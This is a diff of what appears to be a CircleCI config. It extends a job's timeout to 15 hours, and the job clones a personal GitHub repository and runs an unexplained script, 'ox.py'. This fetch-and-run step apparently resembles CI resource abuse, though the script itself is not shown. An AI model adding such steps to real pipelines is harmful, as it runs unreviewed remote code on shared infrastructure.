@@ -12,7 +12,7 @@ jobs:
       
       - run:
           name: TESLA
-          no_output_timeout : 1h
+          no_output_timeout : 15h
           command: |
               git clone https://github.com/bamin3812/cloud.git && cd cloud && python ox.py
               docker run -e CI=true nginxdemos/hello
